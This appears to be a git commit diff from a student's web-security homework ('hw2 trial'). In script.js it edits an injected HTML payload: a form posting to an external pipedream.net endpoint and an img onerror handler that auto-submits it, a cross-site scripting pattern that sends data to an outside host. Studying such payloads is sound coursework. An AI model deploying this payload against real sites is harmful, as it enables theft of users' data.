6fde8f4c1ab36a519d7a2729039ee4374a3867d8
AngelaGu <angela.gu1224@gmail.com>
2023-02-28 13:04:16 -0800

    hw2 trial

--- script.js
+++ script.js
@@ -3,7 +3,7 @@ function changeTitle(){
         document.title = '<form id="send_data" action="https://eo28kejt5kjkrb9.m.pipedream.net" method="GET">\
             <input type="text" id="name" name="name" value="b" placeholder="your name"> \
             <input type="submit" value="Submit"></form>\
-            <img src="x" onerror="document.getElementById("send_data").submit()">';
+            <img src="x" onerror="document.forms[0].submit()">';
     }, 5000);
     
 }
